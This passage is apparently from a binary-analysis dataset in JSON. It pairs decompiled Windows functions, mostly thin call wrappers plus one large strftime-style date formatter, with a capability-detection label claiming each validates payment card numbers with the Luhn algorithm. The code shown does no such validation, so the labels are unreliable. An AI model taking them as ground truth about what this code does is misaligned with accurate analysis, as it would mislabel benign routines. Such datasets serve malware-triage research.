    "004627f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004627f1(uint32_t arg_8h)\n\n{\n    if (arg_8h == 0) {\n        fcn.00401cbc(4);\n        return;\n    }\n    fcn.0040204a((arg_8h & 7) * 0x18 + 0x56f128);\n    return;\n}\n",
        "token_count": 81
    },
    "0046362e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046362e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.004034cc(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "00463fe9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463fe9(uint arg_8h, uint arg_ch)\n\n{\n    uint in_ECX;\n    \n    fcn.00404390(in_ECX, arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 52
    },
    "004670ab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004670ab(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = fcn.0040586c();\n    iVar2 = fcn.00401e97(*puVar1, puVar1[1], arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar2 < 0) {\n        iVar2 = -1;\n    }\n    return iVar2;\n}\n",
        "token_count": 139
    },
    "004670ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004670ef(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    fcn.00405c77(noname_0, noname_1, arg_10h);\n    return;\n}\n",
        "token_count": 56
    },
    "0046774b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046774b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.00403bfc(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 61
    },
    "00467770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00467770(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.004020f9(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "0046beef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046beef(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00401de8(arg_8h, *(in_ECX + 0x14), 0x7ffffffe);\n    return;\n}\n",
        "token_count": 61
    },
    "0046bf4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bf4b(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.0040355d(arg_8h, *(in_ECX + 0x14), 0x7ffffffe);\n    return;\n}\n",
        "token_count": 62
    },
    "0048208b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048208b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00404214(arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 55
    },
    "00482277": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00482277(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004046ab(arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 54
    },
    "00482392": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00482392(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040423c(arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 55
    },
    "0048f123": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0048f123(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00404c6e(arg_8h, arg_ch, arg_10h, arg_14h);\n    return arg_8h;\n}\n",
        "token_count": 69
    },
    "0049713c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0049713c(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.004048e5(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "00497161": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00497161(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00403607(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 57
    },
    "00497186": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00497186(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.004048e5(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004971ab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004971ab(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00403607(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 57
    },
    "004a8031": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004a8031(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    fcn.00493ab5(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return;\n}\n",
        "token_count": 97
    },
    "004a80b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004a80b8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    fcn.00493c92(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return;\n}\n",
        "token_count": 98
    },
    "004a8ebe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004a8ebe(uint *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    fcn.0040533a(*arg_8h, arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004a9b51": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004a9b51(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00405f56(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "004a9b76": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004a9b76(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.004038dc(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "004ae4dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004ae4dd(uint arg_8h)\n\n{\n    uint arg_ch;\n    \n    arg_ch = fcn.00403945(1);\n    fcn.00404a6b(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 58
    },
    "004ae69c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004ae69c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004013d9(arg_8h, 0xffffffff, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 68
    },
    "004ba055": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004ba055(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004b246e(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "004ba071": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004ba071(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004b2519(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "004ba08d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004ba08d(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004b23bc(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "004ba0a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004ba0a9(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004b2519(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 46
    },
    "004bac26": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004bac26(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00405786(arg_8h, arg_ch, arg_10h, arg_14h, 0, arg_18h);\n    return;\n}\n",
        "token_count": 76
    },
    "004bac4e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004bac4e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00405786(arg_8h, arg_ch, arg_10h, arg_14h, 0, 0);\n    return;\n}\n",
        "token_count": 69
    },
    "004bae6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004bae6c(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint32_t arg_20h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint8_t uVar6;\n    uint32_t in_ECX;\n    char32_t *pcVar7;\n    bool bVar8;\n    bool bVar9;\n    uint uVar10;\n    uint32_t uVar11;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = arg_ch;\n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    if (0x5a < uVar3) {\n        while (uVar3 < 0x6f) {\n            if (uVar3 == 0x6e) {\n                pcVar7 = L\"\\n:\\t+%\";\n                goto code_r0x004bb7ff;\n            }\n            if (uVar3 < 0x66) {\n                if (uVar3 == 0x65) {\n                    uVar3 = arg_10h[3];\n                    if (0x1e < uVar3 - 1) goto code_r0x004bb116;\n                    uVar6 = (arg_20h ^ 1) << 5;\n                    goto code_r0x004bb15d;\n                }\n                if (uVar3 == 0x61) {\n                    if (6 < arg_10h[6]) goto code_r0x004bb116;\n                    pcVar7 = *(arg_1ch + 0xb4 + arg_10h[6] * 4);\n                    goto code_r0x004bb7ff;\n                }\n                if (uVar3 == 0x62) {\n                    if (0xb < arg_10h[4]) goto code_r0x004bb116;\n                    pcVar7 = *(arg_1ch + 0xec + arg_10h[4] * 4);\n                    goto code_r0x004bb7ff;\n                }\n                if (uVar3 != 99) {\n                    if (uVar3 != 100) {\n                        return 0;\n                    }\n                    uVar3 = arg_10h[3];\n                    if (0x1e < uVar3 - 1) goto code_r0x004bb116;\n                    goto code_r0x004baf95;\n                }\n                if ((arg_1ch != 0x552668) || (arg_20h != 0)) {\n                    cVar2 = fcn.004bbc1e(arg_8h, arg_20h & 0xff, arg_10h, arg_14h, arg_18h, arg_1ch);\n                    if (cVar2 == '\\0') goto code_r0x004bafec;\n                    fcn.004bbbe1(L\" \\n:\\t+%\", arg_14h, arg_18h);\n                    cVar2 = fcn.004bbc1e(arg_8h, 2, arg_10h, arg_14h, arg_18h, arg_1ch);\n                    goto code_r0x004bb094;\n                }\n                cVar2 = fcn.004bae6c(arg_8h, 0x61, arg_10h, arg_14h, arg_18h, 0x552668, 0);\n                if (cVar2 == '\\0') goto code_r0x004bafec;\n                fcn.004bbbe1(L\" \\n:\\t+%\", arg_14h, arg_18h);\n                cVar2 = fcn.004bae6c(arg_8h, 0x62, arg_10h, arg_14h, arg_18h, 0x552668, 0);\n                if (cVar2 == '\\0') goto code_r0x004bafec;\n                fcn.004bbbe1(L\" \\n:\\t+%\", arg_14h, arg_18h);\n                cVar2 = fcn.004bae6c(arg_8h, 0x65, arg_10h, arg_14h, arg_18h, 0x552668, 0);\n                if (cVar2 == '\\0') goto code_r0x004bafec;\n                fcn.004bbbe1(L\" \\n:\\t+%\", arg_14h, arg_18h);\n                cVar2 = fcn.004bae6c(arg_8h, 0x54, arg_10h, arg_14h, arg_18h, 0x552668, 0);\n                if (cVar2 == '\\0') goto code_r0x004bafec;\n                fcn.004bbbe1(L\" \\n:\\t+%\", arg_14h, arg_18h);\n                arg_20h = 0;\n                uVar10 = 0x59;\n                goto code_r0x004bb089;\n            }\n            if (uVar3 == 0x67) {\n                if (9999 < arg_10h[5] + 0x76c) goto code_r0x004bb116;\n                uVar11 = 0x30;\n                uVar10 = 2;\n                iVar4 = fcn.004bae11(arg_10h[5], arg_10h[6], arg_10h[7]);\n                uVar3 = iVar4 + 0x76c;\n                goto code_r0x004baf54;\n            }\n            if (uVar3 != 0x68) {\n                if (uVar3 == 0x6a) {\n                    uVar3 = arg_10h[7];\n                    if (0x16d < uVar3) goto code_r0x004bb116;\n                    uVar10 = 3;\n                }\n                else {\n                    if (uVar3 != 0x6d) {\n                        return 0;\n                    }\n                    uVar3 = arg_10h[4];\n                    if (0xb < uVar3) goto code_r0x004bb116;\n                    uVar10 = 2;\n                }\n                uVar11 = (arg_20h != 0) - 1U & 0x30;\n                uVar3 = uVar3 + 1;\n                goto code_r0x004baee7;\n            }\n            arg_ch._0_2_ = 0x62;\n            uVar3 = 0x62;\n        }\n        if (uVar3 < 0x78) {\n            if (uVar3 != 0x77) {\n                if (uVar3 == 0x70) {\n                    if (0x17 < arg_10h[2]) goto code_r0x004bb116;\n                    if (arg_10h[2] < 0xc) {\n                        pcVar7 = *(arg_1ch + 0x14c);\n                    }\n                    else {\n                        pcVar7 = *(arg_1ch + 0x150);\n                    }\ncode_r0x004bb7ff:\n                    fcn.004bbbe1(pcVar7, arg_14h, arg_18h);\n                    return 1;\n                }\n                if (uVar3 == 0x72) {\n                    if (arg_1ch == 0x552668) {\n                        cVar2 = fcn.004bae6c(arg_8h, 0x49, arg_10h, arg_14h, arg_18h, 0x552668, arg_20h);\n                        if (cVar2 == '\\0') goto code_r0x004bafec;\n                        fcn.004bbbe1(L\":\\t+%\", arg_14h, arg_18h);\n                        cVar2 = fcn.004bae6c(arg_8h, 0x4d, arg_10h, arg_14h, arg_18h, 0x552668, arg_20h);\n                        if (cVar2 == '\\0') goto code_r0x004bafec;\n                        fcn.004bbbe1(L\":\\t+%\", arg_14h, arg_18h);\n                        cVar2 = fcn.004bae6c(arg_8h, 0x53, arg_10h, arg_14h, arg_18h, 0x552668, arg_20h);\n                        if (cVar2 == '\\0') goto code_r0x004bafec;\n                        fcn.004bbbe1(L\" \\n:\\t+%\", arg_14h, arg_18h);\n                        uVar10 = 0x70;\n                        goto code_r0x004bb089;\n                    }\n                    cVar2 = fcn.004bae6c(arg_8h, 0x58, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n                    goto code_r0x004bb094;\n                }\n                if (uVar3 == 0x74) {\n                    pcVar7 = L\"\\t+%\";\n                    goto code_r0x004bb7ff;\n                }\n                if (uVar3 != 0x75) {\n                    return 0;\n                }\n            }\n            uVar3 = arg_10h[6];\n            if (uVar3 < 7) {\n                if ((uVar3 == 0) && (arg_ch == 0x75)) {\n                    uVar3 = 7;\n                }\n                uVar11 = (arg_20h != 0) - 1U & 0x30;\n                uVar10 = 1;\n                goto code_r0x004baee7;\n            }\n            goto code_r0x004bb116;\n        }\n        if (uVar3 != 0x78) {\n            if (uVar3 == 0x79) {\n                uVar3 = arg_10h[5] + 0x76c;\n                if (uVar3 < 10000) {\n                    uVar11 = (arg_20h != 0) - 1U & 0x30;\n                    uVar10 = 2;\ncode_r0x004baf54:\n                    uVar3 = uVar3 % 100;\n                    goto code_r0x004baee7;\n                }\n            }\n            else {\n                if (uVar3 != 0x7a) {\n                    return 0;\n                }\n                fcn.0040574f();\n                var_4h = 0;\n                iVar4 = fcn.00403251(&var_4h);\n                if (iVar4 == 0) {\n                    if (arg_10h[8] != 0) {\n                        var_8h = 0;\n                        iVar4 = fcn.004044f3(&var_8h);\n                        if (iVar4 != 0) goto code_r0x004bb116;\n                        var_4h = var_4h + var_8h;\n                    }\n                    iVar4 = ((var_4h ^ var_4h >> 0x1f) - (var_4h >> 0x1f)) / 0x3c;\n                    pcVar7 = L\"+%\";\n                    if (0 < var_4h) {\n                        pcVar7 = 0x54e580;\n                    }\n                    fcn.004bbbe1(pcVar7, arg_14h, arg_18h);\n                    fcn.004bbaa1(iVar4 / 0x3c, 2, arg_14h, arg_18h, 0x30);\n                    fcn.004bbaa1(iVar4 % 0x3c, 2, arg_14h, arg_18h, 0x30);\n                    return 1;\n                }\n            }\n            goto code_r0x004bb116;\n        }\n        arg_20h = arg_20h & 0xff;\ncode_r0x004bb3d2:\n        cVar2 = fcn.004bbc1e(arg_8h, arg_20h, arg_10h, arg_14h, arg_18h, arg_1ch);\n        goto code_r0x004bb094;\n    }\n    if (uVar3 == 0x5a) {\n        fcn.0040574f();\n        iVar4 = fcn.00406055();\n        pcVar7 = *(iVar4 + (-(arg_10h[8] != 0) & 4));\n        goto code_r0x004bb7ff;\n    }\n    if (uVar3 < 0x4e) {\n        if (uVar3 == 0x4d) {\n            uVar3 = arg_10h[1];\n            bVar8 = uVar3 < 0x3b;\n            bVar9 = uVar3 == 0x3b;\n            goto code_r0x004bb574;\n        }\n        if (uVar3 < 0x45) {\n            if (uVar3 != 0x44) {\n                if (uVar3 == 0x25) {\n                    pcVar7 = L\"%\";\n                    goto code_r0x004bb7ff;\n                }\n                if (uVar3 == 0x41) {\n                    if (arg_10h[6] < 7) {\n                        pcVar7 = *(arg_1ch + 0xd0 + arg_10h[6] * 4);\n                        goto code_r0x004bb7ff;\n                    }\n                }\n                else if (uVar3 == 0x42) {\n                    if (arg_10h[4] < 0xc) {\n                        pcVar7 = *(arg_1ch + 0x11c + arg_10h[4] * 4);\n                        goto code_r0x004bb7ff;\n                    }\n                }\n                else {\n                    if (uVar3 != 0x43) {\n                        return 0;\n                    }\n                    if (arg_10h[5] + 0x76c < 10000) {\n                        uVar11 = (arg_20h != 0) - 1U & 0x30;\n                        uVar10 = 2;\n                        uVar3 = (arg_10h[5] + 0x76c) / 100;\n                        goto code_r0x004baee7;\n                    }\n                }\n                goto code_r0x004bb116;\n            }\n            cVar2 = fcn.004bae6c(arg_8h, 0x6d, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if (cVar2 == '\\0') goto code_r0x004bafec;\n            fcn.004bbbe1(0x550664, arg_14h, arg_18h);\n            cVar2 = fcn.004bae6c(arg_8h, 100, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if (cVar2 == '\\0') goto code_r0x004bafec;\n            fcn.004bbbe1(0x550664, arg_14h, arg_18h);\n            uVar10 = 0x79;\n        }\n        else {\n            if (uVar3 != 0x46) {\n                if (uVar3 == 0x47) {\n                    if (9999 < arg_10h[5] + 0x76c) goto code_r0x004bb116;\n                    uVar11 = 0x30;\n                    uVar10 = 4;\n                    iVar4 = fcn.004bae11(arg_10h[5], arg_10h[6], arg_10h[7]);\n                    uVar3 = iVar4 + 0x76c;\n                    goto code_r0x004baee7;\n                }\n                if (uVar3 != 0x48) {\n                    if (uVar3 != 0x49) {\n                        return 0;\n                    }\n                    if (0x17 < arg_10h[2]) goto code_r0x004bb116;\n                    uVar3 = arg_10h[2] % 0xc;\n                    if (uVar3 == 0) {\n                        uVar3 = 0xc;\n                    }\n                    uVar6 = (arg_20h != 0) - 1U & 0x30;\ncode_r0x004bb15d:\n                    uVar11 = uVar6;\n                    uVar10 = 2;\n                    goto code_r0x004baee7;\n                }\n                uVar3 = arg_10h[2];\n                bVar8 = uVar3 < 0x17;\n                bVar9 = uVar3 == 0x17;\n                goto code_r0x004bb574;\n            }\n            cVar2 = fcn.004bae6c(arg_8h, 0x59, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if (cVar2 == '\\0') goto code_r0x004bafec;\n            fcn.004bbbe1(0x54e580, arg_14h, arg_18h);\n            cVar2 = fcn.004bae6c(arg_8h, 0x6d, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if (cVar2 == '\\0') goto code_r0x004bafec;\n            fcn.004bbbe1(0x54e580, arg_14h, arg_18h);\n            uVar10 = 100;\n        }\n        goto code_r0x004bb089;\n    }\n    if (7 < uVar3 - 0x52) {\n        return 0;\n    }\n    // switch table (8 cases) at 0x4bb810\n    switch(*((uVar3 - 0x52) * 4 + 0x4bb810)) {\n    case 0x4bb649:\n        cVar2 = fcn.004bae6c(arg_8h, 0x48, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (cVar2 == '\\0') goto code_r0x004bafec;\n        fcn.004bbbe1(L\":\\t+%\", arg_14h, arg_18h);\n        uVar10 = 0x4d;\n        goto code_r0x004bb089;\n    case 0x4bb693:\n        uVar3 = *arg_10h;\n        bVar8 = uVar3 < 0x3c;\n        bVar9 = uVar3 == 0x3c;\ncode_r0x004bb574:\n        if (!bVar8 && !bVar9) {\ncode_r0x004bb116:\n            puVar5 = fcn.004039a4();\n            *puVar5 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\ncode_r0x004baf95:\n        uVar11 = (arg_20h != 0) - 1U & 0x30;\n        uVar10 = 2;\n        break;\n    case 0x4bb6a0:\n        cVar2 = fcn.004bae6c(arg_8h, 0x48, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (cVar2 == '\\0') goto code_r0x004bafec;\n        fcn.004bbbe1(L\":\\t+%\", arg_14h, arg_18h);\n        cVar2 = fcn.004bae6c(arg_8h, 0x4d, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (cVar2 == '\\0') goto code_r0x004bafec;\n        fcn.004bbbe1(L\":\\t+%\", arg_14h, arg_18h);\n        uVar10 = 0x53;\ncode_r0x004bb089:\n        cVar2 = fcn.004bae6c(arg_8h, uVar10, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\ncode_r0x004bb094:\n        if (cVar2 != '\\0') {\n            return 1;\n        }\ncode_r0x004bafec:\n        puVar5 = fcn.004039a4();\n        *puVar5 = 0x16;\n        return 0;\n    case 0x4bb70d:\n        uVar11 = arg_10h[6];\n        if (uVar11 < 7) {\n            if (arg_ch == 0x57) {\n                if (uVar11 == 0) {\n                    uVar11 = 6;\n                }\n                else {\n                    uVar11 = uVar11 - 1;\n                }\n            }\n            uVar1 = arg_10h[7];\n            if (uVar1 < 0x16e) {\n                uVar3 = 0;\n                if ((uVar11 <= uVar1) && (uVar3 = uVar1 / 7,  uVar11 <= uVar1 % 7)) {\n                    uVar3 = uVar3 + 1;\n                }\n                uVar11 = (arg_20h != 0) - 1U & 0x30;\n                uVar10 = 2;\n                break;\n            }\n        }\n        goto code_r0x004bb116;\n    case 0x4bb768:\n        uVar11 = (arg_20h != 0) - 1U & 0x30;\n        uVar10 = 2;\n        uVar3 = fcn.004bacfc(arg_10h[5], arg_10h[6], arg_10h[7]);\n        break;\n    case 0x4bb798:\n        arg_20h = 2;\n        goto code_r0x004bb3d2;\n    case 0x4bb7ab:\n        uVar3 = arg_10h[5] + 0x76c;\n        if (9999 < uVar3) goto code_r0x004bb116;\n        uVar11 = (arg_20h != 0) - 1U & 0x30;\n        uVar10 = 4;\n    }\ncode_r0x004baee7:\n    fcn.004bbaa1(uVar3, uVar10, arg_14h, arg_18h, uVar11);\n    return 1;\n}\n",
        "token_count": 5097
    },
    "004bcf91": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004bcf91(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00404593(arg_8h, arg_ch, arg_10h, arg_14h, 0, arg_18h);\n    return;\n}\n",
        "token_count": 77
    },
    "004bcfb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004bcfb9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00404593(arg_8h, arg_ch, arg_10h, arg_14h, 0, 0);\n    return;\n}\n",
        "token_count": 69
    },
    "004c1f57": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c1f57(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.00405119(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040407f(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 121
    },
    "004c205f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c205f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.00405119(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040407f(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c2167": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c2167(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.00405885(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040394f(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c226f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c226f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.00405885(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040394f(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c2377": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c2377(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.00405119(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040407f(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c23df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
